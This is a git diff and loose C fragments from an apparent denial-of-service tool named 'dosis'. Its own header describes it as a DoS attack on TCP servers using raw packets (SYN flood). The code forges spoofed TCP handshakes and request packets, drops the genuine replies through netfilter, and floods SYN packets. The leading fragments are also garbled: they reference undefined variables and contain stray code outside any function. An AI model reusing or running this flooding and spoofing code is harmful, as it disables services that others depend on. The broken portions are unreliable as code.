static void tea_timer_listener_thread_cleanup(void *x)
{
  /* nothing here */
}

static void tea_timer_listener_thread(void)
{
  int r;
  ipqex_msg_t msg;
  THREAD_WORK *tw;

  /* initialize thread */
  pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, &r);
  pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, &r);
  pthread_cleanup_push((void *) tea_timer_listener_thread_cleanup, NULL);

  /* get packets and classify */
  while(!cfg.finalize)
  {
    if((status = ipqex_msg_read(&msg, 0)) <= 0)
    {
      if(status < 0)
        ERR("Error reading from IPQ: %s (errno %s)", ipq_errstr(), strerror(errno));
      continue;
    }

    tw = tea_timer_search_listener(m->b, m->s);
    if(tw)
    {
      pthread_setcanceltype(PTHREAD_CANCEL_DEFERRED, NULL);
      tea_timer_push_msg(tw, m->b, m->s);
      pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS, NULL);
      pthread_testcancel();
    } else
      if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
        ERR("Cannot DROP IPQ packet.");
  }

  /* finish him */
  pthread_cleanup_pop(1);
  pthread_exit(NULL);
}

  /* initialize */
  DBG("Initializing IPQ...");
  if(ipqex_init(&attack_tcpopen__ipq, BUFSIZE))
    FAT("  !! Cannot initialize IPQ.");

  /* up! */
  return pthreadex_flag_up(&attack_flag);

  /* finalize ipq */
  ipqex_destroy(&attack_tcpopen__ipq);

  /* flag that will keep attack threads waiting for work */

@@ -59,118 +59,66 @@ static pthreadex_flag_t    attack_flag;
-    if((status = ipqex_msg_read(&(tw->msg), 0)) <= 0)
+    /* but ... in some circumstances ... */
+    if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
+    && ipqex_get_ip_header(&(tw->msg))->daddr == tw->cfg.shost.addr.in.addr
+    && ipqex_get_tcp_header(&(tw->msg))->source == tw->cfg.dhost.port)
     {
-    } else {
-      /* but ... in some circumstances ... */
-      if(ipqex_get_ip_header(&(tw->msg))->protocol == 6
-      && ipqex_get_ip_header(&(tw->msg))->daddr == tw->cfg.shost.addr.in.addr
-      && ipqex_get_tcp_header(&(tw->msg))->source == tw->cfg.dhost.port)
+      DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
+      /*
+      DBG2("[LL_%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
+              tw->w->id,
+              ipqex_identify_ip_protocol(&(tw->msg)),
+              (ipqex_get_ip_header(&(tw->msg))->saddr >>  0) & 0x00ff,
+              (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
+              (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
+              (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
+              ipqex_get_tcp_header(&(tw->msg))->dest, cfg->dhost.port,
+              ipqex_get_tcp_header(&(tw->msg))->rst,
+              ipqex_get_ip_header(&(tw->msg))->saddr,
+              cfg->shost.s_addr);
+      */
+
+      /* ignore any packet that have anything to do with this connection */
+      if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
+        ERR("[LL_%02u] Cannot DROP IPQ packet.", tw->w->id);
+
+      /* in some special case (handshake) send kakitas */
+      if(ipqex_get_tcp_header(&(tw->msg))->syn != 0
+      && ipqex_get_tcp_header(&(tw->msg))->ack != 0)
       {
-        DBG("[LL_%02u] Received a spoofed connection packet.", tw->w->id);
-        /*
-        DBG2("[LL_%02u] Dropped << %d - %d.%d.%d.%d:%d/%d (rst=%d) => [%08x/%08x] >>",
-                tw->w->id,
-                ipqex_identify_ip_protocol(&(tw->msg)),
-                (ipqex_get_ip_header(&(tw->msg))->saddr >>  0) & 0x00ff,
-                (ipqex_get_ip_header(&(tw->msg))->saddr >>  8) & 0x00ff,
-                (ipqex_get_ip_header(&(tw->msg))->saddr >> 16) & 0x00ff,
-                (ipqex_get_ip_header(&(tw->msg))->saddr >> 24) & 0x00ff,
-                ipqex_get_tcp_header(&(tw->msg))->dest, cfg->dhost.port,
-                ipqex_get_tcp_header(&(tw->msg))->rst,
-                ipqex_get_ip_header(&(tw->msg))->saddr,
-                cfg->shost.s_addr);
-        */
-
-        /* ignore any packet that have anything to do with this connection */
-        if(ipqex_set_verdict(&tw->msg, NF_DROP) <= 0)
-          ERR("[LL_%02u] Cannot DROP IPQ packet.", tw->w->id);
-
-        /* in some special case (handshake) send kakitas */
-        if(ipqex_get_tcp_header(&(tw->msg))->syn != 0
-        && ipqex_get_tcp_header(&(tw->msg))->ack != 0)
-        {
-          /* send handshake and data TCP packet */
-          DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
-          ln_send_packet(&(tw->lnc),
-                         &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                         &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                         TH_ACK,
-                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                         NULL, 0);
-          ln_send_packet(&(tw->lnc),
-                         &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
-                         &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                         TH_ACK | TH_PUSH,
-                         ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
-                         ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
-                         (char *) tw->cfg.req, tw->cfg.req_size);
-        }
-      } else
-        /* policy: accept anything unknown */
-        if(ipqex_set_verdict(&tw->msg, NF_ACCEPT) <= 0)
-          ERR("[LL_%02u] Cannot ACCEPT IPQ packet.", tw->w->id);
-    }
-  }
-}
-
-/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * SENDER THREADS
- *   This thread processes all packets coming from NETFILTER/IP_QUEUE and
- *   add more packages to the queue when we have to answer to some SYN+ACK
- *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
-
-static void sender_thread(TCPOPEN_WORK *tw)
-{
-  unsigned int seq = libnet_get_prand(LIBNET_PRu32);
-  int npackets, i;
-
-  DBG("[SS_%02u] Started sender thread", tw->w->id);
-
-  /* set how many packets will be sent by this thread */
-  npackets = tw->cfg.npackets;
-
-  /* ATTACK */
-  while(!cfg.finalize)
-  {
-    /* wait for work */
-    pthreadex_flag_wait(&attack_flag);
-
-    /* build TCP packet with payload (if requested) */
-    DBG("[SS_%02u] Sending %d packets...", tw->w->id, npackets);
-    for(i = 0; i < npackets; i++)
-    {
-      seq += libnet_get_prand(LIBNET_PRu16) & 0x00ff;
-      ln_send_packet(&tw->lnc,
-                     &tw->cfg.shost.addr.in.inaddr, libnet_get_prand(LIBNET_PRu16),
-                     &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
-                     TH_SYN, 13337,
-                     seq, 0,
-                     NULL, 0);
+        /* send handshake and data TCP packet */
+        DBG("[LL_%02u]   - Request packet sending...", tw->w->id);
+        ln_send_packet(&(tw->lnc),
+                       &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                       &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
+                       TH_ACK,
+                       ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
+                       NULL, 0);
+        ln_send_packet(&(tw->lnc),
+                       &tw->cfg.shost.addr.in.inaddr, ntohs(ipqex_get_tcp_header(&(tw->msg))->dest),
+                       &tw->cfg.dhost.addr.in.inaddr, tw->cfg.dhost.port,
+                       TH_ACK | TH_PUSH,
+                       ntohs(ipqex_get_tcp_header(&(tw->msg))->window),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->ack_seq),
+                       ntohl(ipqex_get_tcp_header(&(tw->msg))->seq) + 1,
+                       (char *) tw->cfg.req, tw->cfg.req_size);
+      }
     }
   }
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * GENERIC HHTP THREAD
+ * GENERIC HTTP THREAD
  *   This thread specializes in different tasks depending on thread number
  *     0 - listener
  *     x - sender
diff --git a/src/dosis/tcpraw.c b/src/dosis/tcpraw.c
index ce5a90a..69e41fa 100644
--- a/src/dosis/tcpraw.c
+++ b/src/dosis/tcpraw.c
@@ -1,5 +1,5 @@
 /*****************************************************************************
- * tcpopen.c
+ * tcpraw.c
  *
  * DoS on TCP servers by raw tcp packets (synflood?).
  *
@@ -49,9 +49,9 @@ typedef struct _tag_TCPOPEN_WORK {
   LN_CONTEXT    lnc;
   ipqex_msg_t   msg;
   TCPOPEN_CFG   cfg;
-} TCPOPEN_WORK;
+} TCPRAW_WORK;
 
-static void send_packets(TCPOPEN_WORK *tw)
+static void send_packets(TCPRAW_WORK *tw)
 {
   pthreadex_timer_t timer;
   unsigned int seq = libnet_get_prand(LIBNET_PRu32);
@@ -99,7 +99,7 @@ static void send_packets(TCPOPEN_WORK *tw)
  *     x - sender
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-static void tcpraw__thread_cleanup(TCPOPEN_WORK *tw)
+static void tcpraw__thread_cleanup(TCPRAW_WORK *tw)
 {
   /* collect libnet data */
   ln_destroy_context(&(tw->lnc));
@@ -110,7 +110,7 @@ static void tcpraw__thread_cleanup(TCPOPEN_WORK *tw)
 static void tcpraw__thread_launch(THREAD_WORK *w)
 {
   int r;
-  TCPOPEN_WORK tw;
+  TCPRAW_WORK tw;
 
   /* initialize specialized work thread data */
   memset(&tw, 0, sizeof(tw));
@@ -133,24 +133,13 @@ static void tcpraw__thread_launch(THREAD_WORK *w)
 }
 
 /*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
- * GO4WORK
- *   Function to enqueue SYN packets.
+ * TCPRAW TEA OBJECT
  *+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/
 
-void attack_tcpopen(void)
-{
-  /* launch attack */
-  launch_thread(attack_tcpopen__thread);
-}
-
-typedef struct _tag_TEA_OBJECT {
-  void (*thread_launch)(THREAD_WORK *tw);
-  void (*thread_stop)(THREAD_WORK *tw);
-  int  (*configure)(THREAD_WORK *tw);
-} TEA_OBJECT;
-
 TEA_OBJECT teaTCPRAW = {
   tcpraw__thread_launch,
+  NULL,
   tcpraw__thread_stop,
   tcpraw__configure,
 };
+
diff --git a/src/dosis/tea.h b/src/dosis/tea.h
index 52f67bb..1916c19 100644
--- a/src/dosis/tea.h
+++ b/src/dosis/tea.h
@@ -28,6 +28,18 @@
 
 #include "pthreadex.h"
 
+typedef struct _tag_TEA_MSG {
+  unsigned int   s;
+  unsigned char *b;
+} TEA_MSG;
+
+typedef struct _tag_TEA_OBJECT {
+  void (*launch)(THREAD_WORK *tw);
+  void (*listen)(THREAD_WORK *tw, TEA_MSG *msg);
+  void (*stop)(THREAD_WORK *tw);
+  int  (*configure)(THREAD_WORK *tw);
+} TEA_OBJECT;
+
 typedef struct _tag_THREAD_WORK {
   int                  id;
   pthread_t            pthread_id;
